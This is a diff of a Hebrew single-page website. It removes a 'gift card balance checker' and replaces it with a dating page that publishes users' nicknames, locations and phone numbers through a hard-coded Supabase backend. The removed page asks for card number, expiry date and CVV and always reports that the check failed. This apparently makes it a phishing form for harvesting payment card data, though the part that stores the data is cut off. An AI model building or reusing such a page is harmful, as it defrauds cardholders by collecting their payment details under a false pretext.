@@ -1,845 +1,1695 @@
 <!DOCTYPE html>
 <html lang="he" dir="rtl">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>בודק יתרה — גיפט כארדים</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<style>
-  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-  :root{
-    --bg:#f8fafc;--card:#fff;--fg:#0f172a;--muted:#64748b;--border:#e2e8f0;
-    --primary:#0f172a;--emerald:#059669;
-    --r:1rem;
-    --font:'Heebo',system-ui,sans-serif;
-  }
-  body{font-family:var(--font);background:linear-gradient(to bottom,#f8fafc,#fff,#f1f5f9);color:var(--fg);min-height:100vh;line-height:1.5}
-  .wrap{max-width:32rem;margin:0 auto;padding:0 1.25rem 3rem}
 
-  /* Header */
-  header{position:sticky;top:0;z-index:30;backdrop-filter:blur(12px);background:rgba(255,255,255,.7);border-bottom:1px solid rgba(226,232,240,.6)}
-  .header-in{max-width:32rem;margin:0 auto;padding:0 1.25rem;height:4rem;display:flex;align-items:center;justify-content:space-between}
-  .brand{display:flex;align-items:center;gap:.625rem}
-  .logo{width:2.25rem;height:2.25rem;border-radius:.75rem;display:grid;place-items:center;background:linear-gradient(135deg,#0f172a,#334155);box-shadow:0 10px 15px -3px rgba(15,23,42,.3)}
-  .logo svg{width:1.25rem;height:1.25rem;color:#fff}
-  .brand h1{font-size:.9375rem;font-weight:700;letter-spacing:-.01em}
-  .brand p{font-size:.6875rem;color:var(--muted)}
-  .status{display:flex;align-items:center;gap:.5rem;font-size:.6875rem;color:var(--muted);padding:.375rem .75rem;border-radius:9999px;background:#ecfdf5;border:1px solid #a7f3d0}
-  .dot{width:.375rem;height:.375rem;border-radius:9999px;background:#10b981;animation:pulse 2s infinite}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+    <meta charset="UTF-8">
 
-  /* Hero */
-  .hero{text-align:center;padding:2rem 0 2.5rem}
-  .badge{display:inline-flex;align-items:center;gap:.5rem;padding:.375rem .875rem;border-radius:9999px;background:rgba(15,23,42,.05);border:1px solid rgba(15,23,42,.1);font-size:.75rem;color:#475569;margin-bottom:1rem}
-  .hero h2{font-size:1.75rem;font-weight:800;letter-spacing:-.02em}
-  @media(min-width:640px){.hero h2{font-size:2.25rem}}
-  .hero p{margin-top:.75rem;color:var(--muted);font-size:.9375rem;max-width:28rem;margin-left:auto;margin-right:auto}
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
 
-  /* Brand selector */
-  .brands-label{font-size:.75rem;font-weight:500;color:var(--muted);margin-bottom:.75rem;padding:0 .25rem}
-  .brands{display:flex;gap:.75rem;overflow-x:auto;padding-bottom:.75rem;margin:0 -.25rem;padding-left:.25rem;padding-right:.25rem;scroll-snap-type:x mandatory}
-  .brand-btn{scroll-snap:start;flex-shrink:0;width:5.5rem;height:3.625rem;border-radius:1rem;padding:.5rem;border:none;background:none;cursor:pointer;transition:transform .2s}
-  .brand-btn .inner{width:100%;height:100%;border-radius:.75rem;display:flex;align-items:center;justify-content:center;color:#fff;font-size:.625rem;font-weight:700;box-shadow:0 4px 6px -1px rgba(0,0,0,.1)}
-  .brand-btn.active{box-shadow:0 0 0 2px #fff,0 0 0 4px var(--primary);transform:scale(1.05)}
-  .brand-btn:hover{transform:scale(1.05)}
-
-  /* Grid */
-  .grid{display:grid;gap:1.5rem}
-  @media(min-width:768px){.grid{grid-template-columns:1fr 1fr;align-items:stretch}}
-
-  /* Card */
-  .vcard{position:relative;aspect-ratio:1.586/1;border-radius:1.5rem;padding:1.5rem;color:#fff;box-shadow:0 25px 50px -12px rgba(15,23,42,.4);overflow:hidden;transition:transform .6s}
-  .vcard .glow1{position:absolute;top:-2.5rem;left:-2.5rem;width:10rem;height:10rem;border-radius:9999px;background:rgba(255,255,255,.1);filter:blur(2rem)}
-  .vcard .glow2{position:absolute;bottom:-3rem;right:-1.5rem;width:11rem;height:11rem;border-radius:9999px;background:rgba(0,0,0,.1);filter:blur(2rem)}
-  .vcard .content{position:relative;height:100%;display:flex;flex-direction:column;justify-content:space-between}
-  .vcard .top{display:flex;align-items:flex-start;justify-content:space-between}
-  .chip{width:3rem;height:2.25rem;border-radius:.375rem;background:linear-gradient(135deg,#fde047,#eab308);opacity:.9}
-  .vcard .brandname{font-size:.875rem;font-weight:600;opacity:.9}
-  .number{font-family:ui-monospace,monospace;font-size:1.125rem;letter-spacing:.18em}
-  @media(min-width:640px){.number{font-size:1.25rem}}
-  .vcard .bottom{display:flex;align-items:flex-end;justify-content:space-between}
-  .vcard .field .lbl{font-size:.5625rem;text-transform:uppercase;opacity:.7;margin-bottom:.25rem}
-  .vcard .field .val{font-family:ui-monospace,monospace;font-size:.875rem;letter-spacing:.05em}
-
-  /* Form */
-  .form{border-radius:1.5rem;background:var(--card);border:1px solid var(--border);box-shadow:0 25px 50px -12px rgba(15,23,42,.08);padding:1.5rem;display:flex;flex-direction:column}
-  .form-head{display:flex;align-items:center;gap:.5rem;margin-bottom:1.25rem}
-  .form-head svg{width:1rem;height:1rem;color:#94a3b8}
-  .form-head h3{font-size:.875rem;font-weight:600;color:#334155}
-  .field{margin-bottom:1rem}
-  .field label{display:block;font-size:.75rem;font-weight:500;color:var(--muted);margin-bottom:.375rem}
-  .field input{width:100%;height:3rem;border-radius:.75rem;border:1px solid var(--border);background:#f8fafc;padding:0 1rem;font-family:ui-monospace,monospace;font-size:.9375rem;letter-spacing:.05em;outline:none;transition:.15s}
-  .field input:focus{border-color:var(--primary);background:#fff;box-shadow:0 0 0 3px rgba(15,23,42,.05)}
-  .row{display:grid;grid-template-columns:1fr 1fr;gap:.75rem}
-  .btn{margin-top:1.25rem;width:100%;height:3rem;border-radius:.75rem;border:none;background:var(--primary);color:#fff;font-size:.875rem;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:.5rem;transition:.15s;box-shadow:0 10px 15px -3px rgba(15,23,42,.2);font-family:var(--font)}
-  .btn:hover:not(:disabled){background:#1e293b}
-  .btn:active:not(:disabled){transform:scale(.98)}
-  .btn:disabled{opacity:.4;cursor:not-allowed}
-  .spin{width:1rem;height:1rem;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:9999px;animation:spin .7s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
-
-  /* Result */
-  .result{margin-top:1.5rem;border-radius:1.5rem;background:var(--card);border:1px solid var(--border);box-shadow:0 25px 50px -12px rgba(15,23,42,.08);overflow:hidden;animation:slideUp .4s ease}
-  @keyframes slideUp{from{opacity:0;transform:translateY(1rem)}to{opacity:1;transform:translateY(0)}}
-  .result-head{background:linear-gradient(to left,#ecfdf5,#fff);padding:1.5rem;display:flex;align-items:center;gap:1rem;border-bottom:1px solid #d1fae5}
-  .res-icon{width:3rem;height:3rem;border-radius:1.25rem;background:var(--emerald);display:grid;place-items:center;box-shadow:0 10px 15px -3px rgba(5,150,105,.3)}
-  .res-icon svg{width:1.75rem;height:1.75rem;color:#fff}
-  .result-head .meta{flex:1}
-  .result-head .meta p{font-size:.75rem;color:#047857;font-weight:500}
-  .result-head .meta h4{font-size:1.125rem;font-weight:700}
-  .result-head .amt{text-align:left}
-  .result-head .amt p{font-size:1.875rem;font-weight:700;font-variant-numeric:tabular-nums}
-  .result-head .amt span{font-size:.6875rem;color:#94a3b8}
-  .result-body{padding:1.5rem}
-  .rrow{display:flex;justify-content:space-between;padding:.5rem 0;border-bottom:1px solid #f1f5f9;font-size:.875rem}
-  .rrow:last-child{border-bottom:none}
-  .rrow .k{color:var(--muted)}
-  .rrow .v{font-weight:500;color:#1e293b}
-  .rrow .v.ok{color:#10b981;display:flex;align-items:center;gap:.375rem}
-  .rrow .v.ok::before{content:"";width:.375rem;height:.375rem;border-radius:9999px;background:#10b981}
-  .reset{margin:0 1.5rem 1.5rem;width:calc(100% - 3rem);height:2.75rem;border-radius:.75rem;border:none;background:#f1f5f9;color:#334155;font-size:.875rem;font-weight:500;cursor:pointer;font-family:var(--font);transition:.15s}
-  .reset:hover{background:#e2e8f0}
-
-  /* Footer */
-  .trust{margin-top:2.5rem;display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:.25rem 1.5rem;font-size:.75rem;color:#94a3b8}
-  .trust span{display:flex;align-items:center;gap:.375rem}
-
-  .hidden{display:none}
-
-  /* =========================
-   Desktop — 768px ומעלה
-   ========================= */
-@media (min-width: 768px) {
-
-  .wrap {
-    max-width: 1100px;
-    padding: 0 2rem 4rem;
-  }
-
-  .header-in {
-    max-width: 1100px;
-    padding: 0 2rem;
-  }
-
-  .hero {
-    padding: 3.5rem 0 3rem;
-  }
-
-  .hero h2 {
-    font-size: 2.5rem;
-  }
-
-  .hero p {
-    font-size: 1rem;
-  }
-
-  .brands {
-    justify-content: center;
-    overflow-x: visible;
-    padding-bottom: 1rem;
-  }
-
-  .brand-btn {
-    width: 7rem;
-    height: 4.25rem;
-  }
-
-  .brand-btn .inner {
-    font-size: .75rem;
-  }
-
-  .grid {
-    grid-template-columns: 1fr 1fr;
-    gap: 2rem;
-    align-items: center;
-  }
-
-  .vcard {
-    width: 100%;
-  }
-
-  .form {
-    padding: 2rem;
-  }
-
-  .result {
-    max-width: 100%;
-  }
-
-  .trust {
-    margin-top: 3rem;
-  }
-}
+    <title>LoveMatch ❤️</title>
 
 
-/* =========================
-   Large Desktop — 1200px ומעלה
-   ========================= */
-@media (min-width: 1200px) {
+    <!-- Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-  .wrap,
-  .header-in {
-    max-width: 1180px;
-  }
 
-  .hero {
-    padding-top: 4rem;
-  }
+    <style>
 
-  .hero h2 {
-    font-size: 2.75rem;
-  }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
 
-  .grid {
-    gap: 2.5rem;
-  }
 
-  .vcard {
-    padding: 2rem;
-  }
+        body {
+            background: #fff4f7;
+            color: #222;
+        }
 
-  .number {
-    font-size: 1.35rem;
-  }
 
-  .form {
-    padding: 2.25rem;
-  }
-}
-</style>
+        /* =========================
+           HEADER
+        ========================= */
+
+        header {
+            background: linear-gradient(
+                135deg,
+                #ff1744,
+                #ff4081
+            );
+
+            color: white;
+
+            padding: 20px 6%;
+
+            display: flex;
+
+            justify-content: space-between;
+
+            align-items: center;
+        }
+
+
+        .logo {
+            font-size: 27px;
+            font-weight: bold;
+        }
+
+
+        /* =========================
+           HERO
+        ========================= */
+
+        .hero {
+            text-align: center;
+
+            padding: 45px 20px 30px;
+        }
+
+
+        .hero h1 {
+            color: #e91e63;
+
+            font-size: 40px;
+
+            margin-bottom: 10px;
+        }
+
+
+        .hero p {
+            color: #777;
+
+            font-size: 17px;
+        }
+
+
+        /* =========================
+           PROFILES
+        ========================= */
+
+        .container {
+            width: 94%;
+
+            max-width: 1000px;
+
+            margin: auto;
+
+            padding-bottom: 100px;
+        }
+
+
+        .profiles {
+            display: grid;
+
+            grid-template-columns:
+                repeat(2, minmax(0, 1fr));
+
+            gap: 15px;
+        }
+
+
+        .profile {
+            background: white;
+
+            border-radius: 18px;
+
+            overflow: hidden;
+
+            box-shadow:
+                0 5px 20px rgba(0,0,0,0.09);
+
+            transition: 0.2s;
+        }
+
+
+        .profile:hover {
+            transform: translateY(-3px);
+        }
+
+
+        .profile-image {
+            width: 100%;
+
+            height: 300px;
+
+            object-fit: cover;
+
+            display: block;
+        }
+
+
+        .no-image {
+            width: 100%;
+
+            height: 300px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            flex-direction: column;
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #ffe0e8,
+                    #fff1f5
+                );
+
+            color: #e91e63;
+
+            font-size: 60px;
+        }
+
+
+        .no-image span {
+            font-size: 14px;
+
+            color: #888;
+
+            margin-top: 8px;
+        }
+
+
+        .profile-content {
+            padding: 15px;
+        }
+
+
+        .name {
+            font-size: 22px;
+
+            font-weight: bold;
+
+            margin-bottom: 7px;
+        }
+
+
+        .age {
+            color: #e91e63;
+
+            font-weight: normal;
+        }
+
+
+        .location {
+            color: #777;
+
+            font-size: 14px;
+
+            margin-bottom: 12px;
+        }
+
+
+        .phone {
+            background: #f8f8f8;
+
+            border-radius: 8px;
+
+            padding: 10px;
+
+            direction: ltr;
+
+            text-align: center;
+
+            margin-bottom: 10px;
+
+            font-weight: bold;
+        }
+
+
+        .buttons {
+            display: grid;
+
+            grid-template-columns: 1fr 1fr;
+
+            gap: 7px;
+        }
+
+
+        .btn {
+            border: none;
+
+            border-radius: 8px;
+
+            padding: 10px 5px;
+
+            cursor: pointer;
+
+            text-decoration: none;
+
+            text-align: center;
+
+            font-size: 13px;
+        }
+
+
+        .copy-btn {
+            background: #eeeeee;
+
+            color: #333;
+        }
+
+
+        .whatsapp-btn {
+            background: #25D366;
+
+            color: white;
+
+            font-weight: bold;
+        }
+
+
+        /* =========================
+           FLOATING PLUS
+        ========================= */
+
+        .add-profile {
+            position: fixed;
+
+            left: 25px;
+
+            bottom: 25px;
+
+            width: 65px;
+
+            height: 65px;
+
+            border-radius: 50%;
+
+            border: none;
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #ff1744,
+                    #e91e63
+                );
+
+            color: white;
+
+            font-size: 36px;
+
+            line-height: 65px;
+
+            text-align: center;
+
+            cursor: pointer;
+
+            box-shadow:
+                0 7px 25px rgba(233,30,99,0.4);
+
+            z-index: 100;
+        }
+
+
+        .add-profile:hover {
+            transform: scale(1.08);
+        }
+
+
+        /* =========================
+           MODAL
+        ========================= */
+
+        .modal {
+            position: fixed;
+
+            inset: 0;
+
+            background:
+                rgba(0,0,0,0.55);
+
+            display: none;
+
+            align-items: center;
+
+            justify-content: center;
+
+            padding: 15px;
+
+            z-index: 200;
+        }
+
+
+        .modal.active {
+            display: flex;
+        }
+
+
+        .modal-box {
+            background: white;
+
+            width: 100%;
+
+            max-width: 500px;
+
+            max-height: 92vh;
+
+            overflow-y: auto;
+
+            border-radius: 20px;
+
+            padding: 25px;
+
+            position: relative;
+        }
+
+
+        .modal-title {
+            font-size: 25px;
+
+            color: #e91e63;
+
+            margin-bottom: 20px;
+        }
+
+
+        .close {
+            position: absolute;
+
+            left: 15px;
+
+            top: 12px;
+
+            border: none;
+
+            background: #eee;
+
+            width: 35px;
+
+            height: 35px;
+
+            border-radius: 50%;
+
+            font-size: 20px;
+
+            cursor: pointer;
+        }
+
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+
+        .form-group label {
+            display: block;
+
+            margin-bottom: 7px;
+
+            font-weight: bold;
+        }
+
+
+        .form-group input {
+            width: 100%;
+
+            padding: 13px;
+
+            border: 1px solid #ddd;
+
+            border-radius: 9px;
+
+            font-size: 16px;
+        }
+
+
+        .form-group input:focus {
+            outline: none;
+
+            border-color: #e91e63;
+        }
+
+
+        .photo-note {
+            background: #fff5f7;
+
+            border: 1px solid #ffd0dc;
+
+            padding: 10px;
+
+            border-radius: 8px;
+
+            color: #777;
+
+            font-size: 13px;
+
+            margin-top: 8px;
+        }
+
+
+        .upload-error {
+            display: none;
+
+            background: #fff0f0;
+
+            color: #c62828;
+
+            padding: 10px;
+
+            border-radius: 8px;
+
+            margin-top: 10px;
+
+            font-size: 14px;
+        }
+
+
+        .upload-error.show {
+            display: block;
+        }
+
+
+        .submit-btn {
+            width: 100%;
+
+            border: none;
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #ff1744,
+                    #e91e63
+                );
+
+            color: white;
+
+            padding: 14px;
+
+            border-radius: 10px;
+
+            font-size: 17px;
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            margin-top: 10px;
+        }
+
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+
+            cursor: not-allowed;
+        }
+
+
+        .loading {
+            display: none;
+
+            text-align: center;
+
+            color: #e91e63;
+
+            margin-top: 10px;
+        }
+
+
+        /* =========================
+           MOBILE
+           עדיין 2 פרופילים בשורה
+        ========================= */
+
+        @media (max-width: 600px) {
+
+            .profiles {
+                grid-template-columns:
+                    repeat(2, minmax(0, 1fr));
+
+                gap: 9px;
+            }
+
+
+            .profile {
+                border-radius: 13px;
+            }
+
+
+            .profile-image,
+            .no-image {
+                height: 190px;
+            }
+
+
+            .profile-content {
+                padding: 10px;
+            }
+
+
+            .name {
+                font-size: 17px;
+            }
+
+
+            .location {
+                font-size: 11px;
+            }
+
+
+            .phone {
+                font-size: 12px;
+
+                padding: 8px;
+            }
+
+
+            .btn {
+                font-size: 11px;
+
+                padding: 9px 2px;
+            }
+
+
+            .hero h1 {
+                font-size: 29px;
+            }
+
+
+            .hero p {
+                font-size: 14px;
+            }
+
+
+            .add-profile {
+                width: 58px;
+
+                height: 58px;
+
+                line-height: 58px;
+
+                font-size: 32px;
+
+                left: 18px;
+
+                bottom: 18px;
+            }
+        }
+
+    </style>
+
 </head>
+
+
 <body>
+
+
+<!-- =========================
+     HEADER
+========================= -->
+
 <header>
-  <div class="header-in">
-    <div class="brand">
-      <div class="logo">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
-      </div>
-      <div>
-        <h1>בודק יתרה</h1>
-        <p>מערכת בדיקת גיפט כארדים</p>
-      </div>
+
+    <div class="logo">
+        ❤️ LoveMatch
     </div>
-    <div class="status"><span class="dot"></span>בדיקה אוליין</div>
-  </div>
+
 </header>
 
-<div class="wrap">
-  <div class="hero">
-    <div class="badge">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l1.5 4.5L18 8l-4.5 1.5L12 14l-1.5-4.5L6 8l4.5-1.5z"/></svg>
-      בדיקת יתרה לכל סוגי הגיפט כארדים
-    </div>
-    <h2>בדיקת יתרת גיפט כארד</h2>
-    <p>הזן את פרטי הכרטיס ובדוק את היתרה הנוכחית באופן מיידי </p>
-  </div>
 
-  <p class="brands-label">בחר סוג כרטיס</p>
-  <div class="brands" id="brands"></div>
+<!-- =========================
+     HERO
+========================= -->
 
-  <div class="grid">
-    <div class="vcard" id="vcard">
-      <div class="glow1"></div>
-      <div class="glow2"></div>
-      <div class="content">
-        <div class="top">
-          <div class="chip"></div>
-          <span class="brandname" id="vcBrand"></span>
-        </div>
-        <div class="number" id="vcNumber">•••• •••• •••• ••••</div>
-        <div class="bottom">
-          <div class="field"><div class="lbl">תוקף</div><div class="val" id="vcExp">MM/YY</div></div>
-          <div class="field" style="text-align:left"><div class="lbl">CVV</div><div class="val">•••</div></div>
-        </div>
-      </div>
-    </div>
+<section class="hero">
 
-    <div class="form">
-      <div class="form-head">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
-        <h3>פרטי הכרטיס</h3>
-      </div>
-  <div class="field">
-          <label>מספר כרטיס</label>
-          <span class="required-mark">*</span>
-       <input
-  class="mono"
-  id="inNumber"
-  placeholder="4242 4242 4242 4242"
-  maxlength="19"
-  inputmode="numeric"
-  oninput="onNumber(this.value)"
-/>
-          <div class="glow"></div>
-        </div>
+    <h1>
+        מצאו את ההתאמה שלכם ❤️
+    </h1>
 
-        <div class="fields two">
+    <p>
+        הכירו אנשים חדשים והתחילו שיחה
+    </p>
 
-          <div class="field">
-            <label>תוקף</label>
-            <span class="required-mark">*</span>
-            <input
-              class="mono"
-              id="inExp"
-              placeholder="MM/YY"
-              maxlength="5"
-              oninput="onExp(this.value)"
-            />
-            <div class="glow"></div>
-          </div>
+</section>
 
-          <div class="field">
-            <label>קוד אבטחה</label>
-            <span class="required-mark">*</span>
-          <input
-  class="mono"
-  id="inCvc"
-  placeholder="•••"
-  maxlength="3"
-  inputmode="numeric"
-  oninput="onCvc(this.value)"
-/>
-            <div class="glow"></div>
-          </div>
 
-        </div>
-      </div>
+<!-- =========================
+     PROFILES
+========================= -->
+
+<main class="container">
+
+    <div
+        id="profiles"
+        class="profiles"
+    >
+
+        <!-- הפרופילים ייטענו מ-Supabase -->
+
     </div>
 
-      <button class="btn" id="checkBtn">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-        בדיקה
-      </button>
-    </div>
-  </div>
+</main>
 
-  <div class="result hidden" id="result">
-  <div class="result-head" style="background:linear-gradient(to left,#fef2f2,#fff);border-bottom:1px solid #fecaca;">
-    <div class="res-icon" style="background:#dc2626;box-shadow:0 10px 15px -3px rgba(220,38,38,.3);">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-        <path d="M18 6 6 18"/>
-        <path d="m6 6 12 12"/>
-      </svg>
+
+<!-- =========================
+     FLOATING PLUS
+========================= -->
+
+<button
+    class="add-profile"
+    id="openModal"
+    title="הוספת פרופיל"
+>
+    +
+</button>
+
+
+<!-- =========================
+     MODAL
+========================= -->
+
+<div
+    class="modal"
+    id="profileModal"
+>
+
+    <div class="modal-box">
+
+        <button
+            class="close"
+            id="closeModal"
+        >
+            ×
+        </button>
+
+
+        <h2 class="modal-title">
+            הוספת פרופיל ❤️
+        </h2>
+
+
+        <form id="profileForm">
+
+
+            <!-- גיל -->
+
+            <div class="form-group">
+
+                <label for="age">
+                    גיל
+                </label>
+
+                <input
+                    id="age"
+                    type="number"
+                    min="18"
+                    max="120"
+                    placeholder="לדוגמה: 25"
+                    required
+                >
+
+            </div>
+
+
+            <!-- שם בדוי -->
+
+            <div class="form-group">
+
+                <label for="nickname">
+                    שם בדוי
+                </label>
+
+                <input
+                    id="nickname"
+                    type="text"
+                    maxlength="40"
+                    placeholder="לדוגמה: מאיה"
+                    required
+                >
+
+            </div>
+
+
+            <!-- מיקום -->
+
+            <div class="form-group">
+
+                <label for="location">
+                    מיקום
+                </label>
+
+                <input
+                    id="location"
+                    type="text"
+                    maxlength="100"
+                    placeholder="לדוגמה: תל אביב"
+                    required
+                >
+
+            </div>
+
+
+            <!-- טלפון -->
+
+            <div class="form-group">
+
+                <label for="phone">
+                    מספר טלפון
+                </label>
+
+                <input
+                    id="phone"
+                    type="tel"
+                    maxlength="30"
+                    placeholder="לדוגמה: 0501234567"
+                    required
+                >
+
+            </div>
+
+
+            <!-- תמונה -->
+
+            <div class="form-group">
+
+                <label for="photo">
+                    תמונת פרופיל
+                    <span style="color:#999;">
+                        (לא חובה)
+                    </span>
+                </label>
+
+                <input
+                    id="photo"
+                    type="file"
+                    accept="image/jpeg,image/png,image/webp"
+                >
+
+
+                <div class="photo-note">
+
+                    אפשר להמשיך גם ללא תמונה.
+                    גודל מקסימלי: 5MB.
+
+                </div>
+
+
+                <div
+                    id="uploadError"
+                    class="upload-error"
+                >
+                    אין אפשרות להעלות תמונה כרגע.
+                    ניתן להמשיך ללא תמונה.
+
+                </div>
+
+            </div>
+
+
+            <!-- הסכמה -->
+
+            <div
+                style="
+                    background:#fff8fa;
+                    padding:12px;
+                    border-radius:9px;
+                    margin-bottom:12px;
+                    font-size:13px;
+                    color:#555;
+                "
+            >
+
+                <label
+                    style="
+                        display:flex;
+                        gap:8px;
+                        align-items:flex-start;
+                    "
+                >
+
+                    <input
+                        type="checkbox"
+                        id="consent"
+                        required
+                    >
+
+                    <span>
+                        אני מאשרת שהפרטים שהזנתי,
+                        כולל מספר הטלפון, יוצגו
+                        בפרופיל באתר.
+                    </span>
+
+                </label>
+
+            </div>
+
+
+            <button
+                type="submit"
+                class="submit-btn"
+                id="submitBtn"
+            >
+                פרסום פרופיל ❤️
+            </button>
+
+
+            <div
+                id="loading"
+                class="loading"
+            >
+                שומר את הפרופיל...
+            </div>
+
+
+        </form>
+
     </div>
 
-    <div class="meta">
-      <p style="color:#b91c1c;">הבדיקה נכשלה</p>
-      <h4>לא ניתן לבדוק את היתרה</h4>
-    </div>
-  </div>
-
-  <div class="result-body">
-    <div class="rrow">
-      <span class="k">סוג כרטיס</span>
-      <span class="v" id="rBrand"></span>
-    </div>
-
-    <div class="rrow">
-      <span class="k">מספר כרטיס</span>
-      <span class="v" id="rNumber" style="font-family:ui-monospace,monospace"></span>
-    </div>
-
-    <div class="rrow">
-      <span class="k">סטטוס</span>
-      <span class="v" style="color:#dc2626;font-weight:600;display:flex;align-items:center;gap:.375rem;">
-        <span style="width:.375rem;height:.375rem;border-radius:9999px;background:#dc2626;"></span>
-        הבדיקה נכשלה
-      </span>
-    </div>
-
-    <div style="margin-top:1rem;padding:1rem;border-radius:.75rem;background:#fef2f2;color:#991b1b;font-size:.875rem;">
-      לא הצלחנו לאמת את פרטי הכרטיס. בדוק את הפרטים ונסה שוב.
-    </div>
-  </div>
-
-  <button class="reset" id="resetBtn">בדיקת כרטיס נוסף</button>
 </div>
 
-  <div class="trust">
-    <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> חיבור מאובטח SSL</span>
-    <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> הצפנה מקצה לקצה</span>
-    <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg> תוצאה מיידית</span>
-  </div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-  const SUPABASE_URL = 'https://dnzvisligajrimrqnufp.supabase.co';
-  const SUPABASE_ANON_KEY = 'sb_publishable_xWNmtq1TIWt9fY0ZCaN8kw_KFy12pmQ';
-
-  const supabaseClient = supabase.createClient(
-    SUPABASE_URL,
-    SUPABASE_ANON_KEY
-  );
-</script>
 
 <script>
-const BRANDS = [
-  {
-    id: "buyme-demo",
-    name: "BUYME",
-    grad: "linear-gradient(135deg,#ec4899,#db2777,#be185d)",
-    glyph: "BUYME"
-  },
-  {
-    id: "max-demo",
-    name: "MAX Gift Card",
-    grad: "linear-gradient(135deg,#7c3aed,#4f46e5,#2563eb)",
-    glyph: "MAX"
-  },
-  {
-    id: "visa-demo",
-    name: "Visa נטען — דמו",
-    grad: "linear-gradient(135deg,#dc2626,#b91c1c,#7f1d1d)",
-    glyph: "VISA post"
-  },
-  {
-    id: "shopping-demo",
-    name: "Shopping Gift Card",
-    grad: "linear-gradient(135deg,#2563eb,#0891b2,#0f766e)",
-    glyph: "Extra"
-  },
-  {
-    id: "multi-demo",
-    name: "Multi Gift Card",
-    grad: "linear-gradient(135deg,#f59e0b,#ea580c,#dc2626)",
-    glyph: "Dream card"
-  }
-];
 
-const brandsEl=document.getElementById("brands");
-let selected=BRANDS[0];
+/* ==================================================
+   SUPABASE CONFIG
+================================================== */
 
-function renderBrands(){
-  brandsEl.innerHTML=BRANDS.map(b=>`
-    <button class="brand-btn ${b.id===selected.id?'active':''}" data-id="${b.id}">
-      <div class="inner" style="background:${b.grad}">
-        ${b.apple
-          ? '<svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.9 2.12-1.6 3.18-1.6.05 0 .1 0 .12.01zm4.565 16.18c-.42.96-.62 1.4-1.16 2.26-.74 1.21-1.79 2.71-3.08 2.72-1.15.01-1.45-.75-3.01-.74-1.56.01-1.89.76-3.05.74-1.29-.01-2.28-1.36-3.02-2.57-2.07-3.4-2.29-7.39-1.01-9.52.91-1.51 2.35-2.39 3.7-2.39 1.38 0 2.24.76 3.38.76 1.1 0 1.77-.76 3.37-.76 1.21 0 2.49.66 3.41 1.8-2.99 1.64-2.51 5.92.47 7.7z"/></svg>'
-          : `<span>${b.glyph}</span>`}
-      </div>
-    </button>`).join("");
-  brandsEl.querySelectorAll(".brand-btn").forEach(btn=>{
-    btn.onclick=()=>{
-      selected=BRANDS.find(b=>b.id===btn.dataset.id);
-      renderBrands();updateCard();
-      document.getElementById("inNumber").value = "";
-document.getElementById("inExp").value = "";
-document.getElementById("inCvc").value = "";
-      hideResult();
-    };
-  });
-}
+const SUPABASE_URL =
+    "https://dnzvisligajrimrqnufp.supabase.co";
 
- // Card visualizer bindings
-function onNumber(v) {
-  const cleaned = v.replace(/\D/g, '').slice(0, 16);
-  const formatted = cleaned.replace(/(\d{4})(?=\d)/g, '$1 ');
+const SUPABASE_KEY =
+    "sb_publishable_xWNmtq1TIWt9fY0ZCaN8kw_KFy12pmQ";
 
-  document.getElementById('inNumber').value = formatted;
-}
 
-function onName(v) {
-  document.getElementById('inName').value = v;
-}
+/* יצירת Supabase client */
 
-function onExp(v) {
-  const d = v.replace(/\D/g, '').slice(0, 4);
-  const f = d.length > 2
-    ? d.slice(0, 2) + '/' + d.slice(2)
-    : d;
+const supabaseClient =
+    window.supabase.createClient(
+        SUPABASE_URL,
+        SUPABASE_KEY
+    );
 
-  document.getElementById('inExp').value = f;
-}
 
-function onCvc(v) {
-  const f = v.replace(/\D/g, '').slice(0, 3);
-  document.getElementById('inCvc').value = f;
-}
+/* ==================================================
+   ELEMENTS
+================================================== */
 
-function fmt(v) {
-  const d = v.replace(/\D/g, "");
